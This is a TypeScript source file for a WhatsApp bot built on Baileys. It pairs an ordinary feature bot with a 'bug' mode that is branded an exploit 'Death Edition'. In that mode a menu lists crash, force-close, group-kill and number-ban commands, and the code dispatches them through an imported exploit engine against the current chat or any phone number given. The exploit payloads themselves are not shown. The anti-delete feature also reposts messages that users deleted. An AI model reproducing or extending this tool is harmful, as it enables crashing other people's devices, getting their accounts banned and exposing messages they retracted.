import { createRequire } from "module";
const require = createRequire(process.cwd() + "/package.json");
const Baileys = require("@whiskeysockets/baileys");

const makeWASocket = Baileys.default?.default || Baileys.default || Baileys;
const {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  downloadMediaMessage,
  proto,
  getDevice
} = Baileys;
// Removed explicit Boom import to avoid dependency issues if it's not top-level
// import { Boom } from "@hapi/boom"; 
import pino from "pino";
import NodeCache from "node-cache";
import { randomUUID } from "crypto";
import { storage } from "./storage";
import fs from "fs";
import path from "path";
import { commands } from "./plugins/types";
import "./plugins/index";
import { messageCache } from "./store";
import { executeExploit } from "./exploit-engine";
import { presenceSettings } from "./plugins/presence";
import { handleChatbotResponse } from "./plugins/chatbot";
import { handleAntiBug, handleReactAll, handleAntiBugCall } from "./plugins/protection";

const logger = pino({ level: "warn" });
const msgRetryCounterCache = new NodeCache();

const activeSockets: Map<string, ReturnType<typeof makeWASocket>> = new Map();
const pairingCodes: Map<string, string> = new Map();

const BOT_NAME = "CORTANA MD X-MASS ED.";
const PREFIX = ".";

async function startSocket(sessionId: string, phoneNumber?: string) {
  try {
    // Retrieve session to get type
    const session = await storage.getSession(sessionId);
    const type = session?.type || 'md'; // default to md

    // Separate storage folders: auth_sessions/md/sessionId vs auth_sessions/bug/sessionId
    const authDir = path.join(process.cwd(), "auth_sessions", type, sessionId);

    if (!fs.existsSync(authDir)) {
      fs.mkdirSync(authDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(authDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      logger,
      printQRInTerminal: false,
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger),
      },
      msgRetryCounterCache,
      browser: ["Ubuntu", "Chrome", "20.0.04"], // More stable for bots than MacOS
      generateHighQualityLinkPreview: true,

      // STABILITY CONFIGURATION
      syncFullHistory: false, // Prevents timeouts during initial sync
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000, // Longer timeout
      keepAliveIntervalMs: 10000, // Frequent keep-alives
      retryRequestDelayMs: 2000,

      getMessage: async (key: any) => {
        return messageCache.get(key.id) || { conversation: '' };
      },
      patchMessageBeforeSending: (message: any) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          };
        }
        return message;
      },
    });

    // Update the map immediately so other parts of the app know it exists
    activeSockets.set(sessionId, sock);

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update: any) => {
      const { connection, lastDisconnect, isNewLogin } = update;

      console.log(`[${type.toUpperCase()}] Session ${sessionId} connection update:`, JSON.stringify(update));

      if (isNewLogin && connection !== "close") {
        console.log(`Session ${sessionId} pairing successful! Marking as connected.`);
        await storage.updateSession(sessionId, { status: "connected" });
        pairingCodes.delete(sessionId);

        let ownerNum = phoneNumber;
        if (!ownerNum) {
          // Try to recover from session
          const sess = await storage.getSession(sessionId);
          ownerNum = sess?.phoneNumber;
        }

        const existingSettings = await storage.getBotSettings(sessionId);
        if (!existingSettings && ownerNum) {
          await storage.createBotSettings({
            sessionId,
            prefix: PREFIX,
            ownerNumber: ownerNum,
            isPublic: true,
          });
        }
      }

      if (connection === "close") {
        // Safe access to status code
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const currentStatus = await storage.getSession(sessionId);

        console.log(`Session ${sessionId} disconnected. Status code: ${statusCode}, Current status: ${currentStatus?.status}`);

        if (statusCode === DisconnectReason.loggedOut) {
          console.log(`Session ${sessionId} logged out`);
          activeSockets.delete(sessionId);
          pairingCodes.delete(sessionId);
          await storage.updateSession(sessionId, { status: "disconnected" });

          // DISABLED AUTO-DELETE to prevent accidental session loss on spurious logouts
          // User must manually delete if needed, or re-pair will handle overwrite
          // try {
          //   fs.rmSync(authDir, { recursive: true, force: true });
          // } catch (e) { console.error("Failed to delete auth dir", e); }

        } else if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
          console.log(`Session ${sessionId} requires restart (515/Restart). Reconnecting in 2s...`);
          activeSockets.delete(sessionId);
          setTimeout(() => startSocket(sessionId, phoneNumber), 2000);
        } else if (statusCode === DisconnectReason.timedOut) {
          console.log(`Session ${sessionId} timed out.`);
          if (currentStatus?.status === 'connected') {
            startSocket(sessionId, phoneNumber);
          } else {
            await storage.updateSession(sessionId, { status: "failed" });
            activeSockets.delete(sessionId);
            pairingCodes.delete(sessionId);
          }
        } else {
          // Unknown disconnect, usually network. Retry.
          console.log(`Session ${sessionId} unknown disconnect. Reconnecting...`);
          startSocket(sessionId, phoneNumber);
        }
      } else if (connection === "open") {
        console.log(`Session ${sessionId} connected successfully!`);
        await storage.updateSession(sessionId, { status: "connected" });
        pairingCodes.delete(sessionId);
      }
    });

    // ═══════ CALL HANDLER (AntiBug) ═══════
    sock.ev.on("call", async (calls) => {
      try {
        await handleAntiBugCall(sock, calls);
      } catch (e) {
        console.error('Call handler error:', e);
      }
    });

    // Only attach standard bot logic if it's the main session
    if (type === 'md') {
      // Handle Antidelete (Message Updates)
      sock.ev.on("messages.update", async (updates: any) => {
        for (const update of updates) {
          if (update.update.messageStubType === proto.WebMessageInfo.StubType.REVOKE && update.key.id) {
            // Message was deleted
            const botSettings = await storage.getBotSettings(sessionId);
            if (!botSettings || botSettings.antideleteMode === 'off') continue;

            const originalMsg = messageCache.get(update.key.id);
            if (originalMsg && originalMsg.message) {
              const deletedTime = new Date();
              const sender = update.key.participant || update.key.remoteJid;
              const textContent = originalMsg.message.conversation || originalMsg.message.extendedTextMessage?.text || "[Media Message]";

              const caption = `🚫 *Anti-Delete Detected*\n\n👤 *Sender:* @${sender.split('@')[0]}\n🕒 *Time:* ${deletedTime.toLocaleTimeString()}\n📝 *Message:* ${textContent}`;

              const messageContent = { ...originalMsg.message };

              if (botSettings.antideleteMode === 'all') {
                // Resend to chat
                await sock.sendMessage(update.key.remoteJid, { text: caption, mentions: [sender] });
                if (!messageContent.conversation && !messageContent.extendedTextMessage) {
                  await sock.sendMessage(update.key.remoteJid, { forward: originalMsg, forceForward: true });
                }
              } else if (botSettings.antideleteMode === 'pm') {
                // Send to Bot Owner
                const owner = botSettings.ownerNumber + '@s.whatsapp.net';
                await sock.sendMessage(owner, { text: `[Deleted in ${update.key.remoteJid}]\n${caption}`, mentions: [sender] });
                if (!messageContent.conversation && !messageContent.extendedTextMessage) {
                  await sock.sendMessage(owner, { forward: originalMsg, forceForward: true });
                }
              }
            }
          }
        }
      });

      sock.ev.on("messages.upsert", async ({ messages, type }: any) => {
        if (type !== "notify") return;

        for (const msg of messages) {
          if (msg.key.id && msg.message) {
            messageCache.add(msg.key.id, msg);
          }

          if (!msg.message || msg.message.protocolMessage) continue;

          // ═══════ PROTECTION & GLOBAL HANDLERS ═══════
          // These run before any command to ensure protection is active
          try {
            // Check for bugs/spam (returns true if message should be ignored/blocked)
            if (await handleAntiBug(sock, msg)) continue;

            // Check for auto-reaction
            await handleReactAll(sock, msg);
          } catch (e) {
            console.error('Protection handler error:', e);
          }
          // ═══════ END PROTECTION ═══════

          const jid = msg.key.remoteJid!;
          const isGroup = jid.endsWith("@g.us");
          const botSettings = await storage.getBotSettings(sessionId);

          // Standard Bot Features (AutoStatus, AntiLink, etc.)

          // 2. Auto Status View & Like
          if (jid === "status@broadcast" && botSettings?.autostatusView) {
            await sock.readMessages([msg.key]);
            await sock.sendMessage("status@broadcast", {
              react: { key: msg.key, text: "💚" }
            }, { statusJidList: [msg.key.participant] });
            continue;
          }

          const isOwnBotMessage = msg.key.fromMe && msg.key.id && msg.key.id.startsWith('3EB0');
          if (isOwnBotMessage) continue;

          // 3. Group Checks
          if (isGroup) {
            const groupSettings = await storage.getGroupSettings(jid);
            if (groupSettings) {
              const sender = msg.key.participant!;
              const body = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

              // Antilink logic ... (simplified for brevity based on existing)
              if (groupSettings.antilinkMode !== 'off' && (body.includes("chat.whatsapp.com") || body.includes("http"))) {
                if (groupSettings.antilinkMode === 'kick') {
                  await sock.sendMessage(jid, { delete: msg.key });
                  await sock.groupParticipantsUpdate(jid, [sender], "remove");
                } else if (groupSettings.antilinkMode === 'warn') {
                  // ... warn logic
                  await sock.sendMessage(jid, { delete: msg.key });
                  await sock.sendMessage(jid, { text: `⚠️ No links!` });
                }
              }

              // Anti-tagall logic...
            }
          }

          await handleMessage(sock, msg, sessionId);
        }
      });
    } else {
      // BUG BOT Logic - "Death Edition"
      sock.ev.on("messages.upsert", async ({ messages, type }: any) => {
        if (type !== "notify") return;

        for (const msg of messages) {
          if (!msg.message) continue;

          // Mark read
          await sock.readMessages([msg.key]);

          const jid = msg.key.remoteJid!;
          let text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

          if (!text) return;

          // Helper to check for command
          const isCmd = text.startsWith(PREFIX);
          const command = isCmd ? text.slice(PREFIX.length).trim().split(' ')[0].toLowerCase() : '';
          const args = text.trim().split(' ').slice(1);
          const q = args.join(" ");

          // Menu Command
          if (isCmd && (command === 'menu' || command === 'help' || command === 'start')) {
            const uptime = process.uptime();
            // Simple uptime formatting
            const hours = Math.floor(uptime / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            const seconds = Math.floor(uptime % 60);
            const uptimeStr = `${hours}h ${minutes}m ${seconds}s`;

            const menuText = `@@        CORTANA EXPLOIT        @@
@@         ☠ DEATH EDITION ☠         @@
@@     CREATOR: EDUXEYOO THE KING     @@
@@         UPTIME: ${uptimeStr}         @@
@@ __________________________________ @@

- ☠🦠  MENU – ENTER IF YOU DARE  🦠☠

+          💉 CRASH CHAMBER
+ .forclose-invis
+ .forclose-call  
+ .forclosexdelay
+ .crash         
+ .crashxdelay   
+ .crash-invis   
+ .blankstc      
+ .delay-invis   
+ .freez-stuck   

+          ☠ GC DEATH ROW
+ .dor    
+ .🥱     
+ .xgc    

+          🦠 BAN EXPLOIT 🦠
+ .perm-ban-num ↳ number (628xxx)
+ .temp-ban-num ↳ number (628xxx)  
+ .gc-death-link ↳ send/reply group link
+ .ch-death-id ↳ reply channel post / send ID

- 🩸 TYPE WRONG... AND YOU'RE NEXT 🩸
- EDUXEYOO OWNS THIS REALM NOW

☠ CORTANA EXPLOIT 🖤`;

            await sock.sendMessage(jid, {
              image: { url: "https://files.catbox.moe/rras91.jpg" },
              caption: menuText
            });
            continue;
          }

          // Execute Exploit Commands
          if (isCmd) {
            // Pass to exploit engine. 
            // We pass the args/target if needed. For commands like .crash, the target is usually the current chat 
            // OR a mentioned user. 
            // exploit-engine executeExploit(sock, command, target) expects target JID.

            // If the command is one of the known exploits, execute it on the current chat or specified target.
            const exploitCommands = ['crash', 'crash-invis', 'crash-ios', 'forclose', 'forclose-invis', 'forclose-call', 'crashxdelay', 'blankstc', 'dor', 'xgc', 'perm-ban-num', 'temp-ban-num'];

            if (exploitCommands.includes(command)) {
              // For bans/remote attacks, user might supply number
              let target = jid;
              if (q) {
                target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
              }

              await executeExploit(sock, command, target);
            }
          }
        }
      });
    }

    return sock;
  } catch (err) {
    console.error(`startSocket failed for ${sessionId}:`, err);
    throw err;
  }
}

export async function requestPairingCode(phoneNumber: string, type: 'md' | 'bug' = 'md'): Promise<{ sessionId: string; pairingCode: string }> {
  const cleanPhone = phoneNumber.replace(/[^0-9]/g, "");

  if (cleanPhone.length < 10) throw new Error("Invalid phone number");

  const sessionId = randomUUID();

  await storage.createSession({
    id: sessionId,
    phoneNumber: cleanPhone,
    type,
    status: "pending",
    creds: null,
    keys: null,
    createdAt: new Date(),
    updatedAt: new Date(),
  });

  const sock = await startSocket(sessionId, cleanPhone);

  await new Promise(resolve => setTimeout(resolve, 3000));

  if (!sock.authState.creds.registered) {
    let retries = 3;
    while (retries > 0) {
      try {
        console.log(`Requesting pairing code for ${cleanPhone}... (Attempt ${4 - retries})`);
        const pairingCode = await sock.requestPairingCode(cleanPhone);
        pairingCodes.set(sessionId, pairingCode);
        return { sessionId, pairingCode };
      } catch (error: any) {
        console.error(`Attempt ${4 - retries} failed: ${error.message}`);
        retries--;
        if (retries === 0) {
          await storage.updateSession(sessionId, { status: "failed" });
          activeSockets.delete(sessionId);
          try { sock.end(undefined); } catch { }
          throw new Error("Failed to generate pairing code after multiple attempts.");
        }
        await new Promise(r => setTimeout(r, 2000));
      }
    }
    throw new Error("Unreachable"); // Should be caught above
  } else {
    await storage.updateSession(sessionId, { status: "connected" });
    throw new Error("Number already linked.");
  }
}

export async function getSessionStatus(sessionId: string): Promise<string> {
  const session = await storage.getSession(sessionId);
  return session?.status || "not_found";
}

export function getPairingCode(sessionId: string): string | undefined {
  return pairingCodes.get(sessionId);
}

export async function disconnectSession(sessionId: string): Promise<void> {
  const sock = activeSockets.get(sessionId);
  if (sock) {
    try {
      sock.end(undefined);
    } catch { }
    activeSockets.delete(sessionId);
  }
  await storage.updateSession(sessionId, { status: "disconnected" });
}

export function getActiveSessionsCount(): number {
  return activeSockets.size;
}

export function getSessionSocket(sessionId?: string): any {
  if (sessionId) {
    return activeSockets.get(sessionId);
  }
  // If no sessionId provided, return the first one found (useful for single-user mode)
  if (activeSockets.size > 0) {
    return activeSockets.values().next().value;
  }
  return undefined;
}

async function handleMessage(sock: ReturnType<typeof makeWASocket>, msg: any, sessionId: string) {
  const jid = msg.key.remoteJid!;
  const isGroup = jid.endsWith("@g.us");

  // ═══════ AUTO-PRESENCE SIMULATION ═══════
  try {
    if (presenceSettings.autoRecordTyping) {
      // Alternate mode: random between recording and typing
      presenceSettings.messageCounter++;
      const mode = presenceSettings.messageCounter % 2 === 0 ? 'recording' : 'composing';
      await sock.sendPresenceUpdate(mode, jid);
      setTimeout(() => sock.sendPresenceUpdate('available', jid), 8000);
    } else if (presenceSettings.autoRecording !== 'off') {
      // Recording mode
      if (presenceSettings.autoRecording === 'all' || (presenceSettings.autoRecording === 'pm' && !isGroup)) {
        await sock.sendPresenceUpdate('recording', jid);
        setTimeout(() => sock.sendPresenceUpdate('available', jid), 8000);
      }
    } else if (presenceSettings.autoTyping !== 'off') {
      // Typing mode
      if (presenceSettings.autoTyping === 'all' || (presenceSettings.autoTyping === 'pm' && !isGroup)) {
        await sock.sendPresenceUpdate('composing', jid);
        setTimeout(() => sock.sendPresenceUpdate('available', jid), 8000);
      }
    }
  } catch (e) {
    // Silently fail if presence update fails
  }
  // ═══════ END AUTO-PRESENCE ═══════

  let text = "";
  if (msg.message) {
    text = msg.message.conversation ||
      msg.message.extendedTextMessage?.text ||
      msg.message.imageMessage?.caption ||
      msg.message.videoMessage?.caption ||
      "";
  }

  if (!text || !text.startsWith(PREFIX)) return;

  const args = text.slice(PREFIX.length).trim().split(/ +/);
  const commandName = args.shift()?.toLowerCase();

  console.log(`[${sessionId}] Command: ${commandName}`);

  const settings = await storage.getBotSettings(sessionId);
  // isGroup already declared above at line 451
  const senderJid = isGroup ? (msg.key.participant || msg.participant || "") : jid;
  const senderNumber = senderJid.split("@")[0];
  const isOwner = senderNumber === settings?.ownerNumber;

  // Bot Mode Check
  if (settings && !settings.isPublic && !isOwner) {
    // Self mode: Only owner can use commands
    return;
  }

  try {
    const cmd = commands.get(commandName || "");
    if (cmd) {
      // Check if command is owner-only
      if (cmd.ownerOnly && !isOwner) {
        await sock.sendMessage(jid, {
          text: `🔒 *Owner Only Command*\n\nThe command \`.${commandName}\` can only be used by the bot owner.`
        });
        return;
      }

      await cmd.execute({
        sock,
        msg,
        args,
        text,
        senderJid,
        isOwner,
        reply: async (text: string) => {
          await sock.sendMessage(jid, { text });
        }
      });
    } else {
      // Show error for unknown commands
      await sock.sendMessage(jid, {
        text: `❌ *Unknown Command*\n\nCommand \`.${commandName}\` not found.\nType \`.menu\` to see all available commands.`
      });
    }
  } catch (error: any) {
    console.error(`Error executing ${commandName}:`, error);
    // Show more descriptive error
    await sock.sendMessage(jid, {
      text: `❌ *Command Error*\n\nFailed to execute \`.${commandName}\`\n\nError: ${error.message || 'Unknown error'}`
    });
  }

  // ═══════ CHATBOT RESPONSE HANDLER ═══════
  // Check for chatbot responses (mentions/replies to bot)
  try {
    await handleChatbotResponse(sock, jid, msg, text, senderJid);
  } catch (e) {
    // Silent fail for chatbot errors
    console.error('[CHATBOT] Error:', e);
  }
  // ═══════ END CHATBOT ═══════
}